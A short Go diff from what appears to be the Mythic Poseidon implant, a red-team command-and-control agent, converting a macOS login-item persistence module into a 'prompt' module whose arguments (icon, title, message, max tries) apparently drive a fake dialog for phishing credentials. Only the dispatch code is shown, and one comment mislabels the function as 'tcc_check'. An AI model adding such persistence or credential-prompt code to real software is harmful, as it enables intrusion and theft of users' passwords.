@@ -1,35 +1,29 @@
-package persist_loginitem
+package prompt
 
 import (
-	// Standard
 	"encoding/json"
-
-	// Poseidon
-
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
 type Arguments struct {
-	Path   string `json:"path"`
-	Name   string `json:"name"`
-	Global bool   `json:"global"`
-	List   bool   `json:"list"`
-	Remove bool   `json:"remove"`
+	Icon        string `json:"icon"`
+	TitleText   string `json:"title"`
+	MessageText string `json:"message"`
+	MaxTries    int    `json:"max_tries"`
 }
 
+// Run - package function to run tcc_check
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-
 	args := Arguments{}
 	err := json.Unmarshal([]byte(task.Params), &args)
-
 	if err != nil {
 		msg.SetError(err.Error())
 		task.Job.SendResponses <- msg
 		return
 	}
-	r := runCommand(args.Path, args.Name, args.Global, args.List, args.Remove)
-	msg.UserOutput = r.Message
+	output := prompt(args)
+	msg.UserOutput = output
 	msg.Completed = true
 	task.Job.SendResponses <- msg
 	return
